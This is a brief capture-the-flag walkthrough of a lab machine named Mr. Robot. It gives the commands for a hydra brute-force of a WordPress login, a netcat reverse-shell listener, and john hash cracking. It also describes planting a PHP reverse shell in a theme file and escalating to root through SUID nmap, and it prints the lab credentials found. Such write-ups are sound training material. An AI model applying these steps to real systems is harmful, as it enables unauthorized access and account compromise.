# HTB – Mr. Robot Walkthrough

## Target IP
`10.129.1.17`

## Tools Used
- Nmap
- Hydra
- Netcat
- Burp Suite
- WordPress
- John the Ripper

## Steps Taken

### 1. Initial Recon

  ```bash
  nmap -sC -sV 10.129.1.17
  ```

Discovered: Port 80, Port 443

## 2. Gained Access
Brute-forced WordPress login with hydra

  ```bash

hydra -l elliot -P rockyou.txt 10.129.xx.xx http-form-post "/wp-login.php:user=^USER^&pass=^PASS^&wp-submit=Log In:F=incorrect"
  ```
Username: elliot, Password: ER28–0652

## 3. Reverse Shell

Logged into WordPress admin

Edited `404.php` theme file and pasted a PHP reverse shell

Set up a listener:

  ```bash
nc -lvnp 4444
  ```

Listener caught reverse shell from daemon

## 4. Privilege Escalation
Found MD5 hash → Cracked hash (c3fcd3d76192e4007dfb496cca67e13b) with John → Password: abcdefghijklmnopqrstuvwxyz

  ```bash
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
  ```

Switched to user robot

  ```bash
su robot
  ```

Exploited SUID nmap --interactive to escalate to root

## 5. Captured All Flags

  ```bash
cat /root/key-2-of-3.txt
  ```

  ```bash
cat /root/key-3-of-3.txt
  ```

## Flag Summary

key-1-of-3.txt

key-2-of-3.txt

key-3-of-3.txt

Rooted.
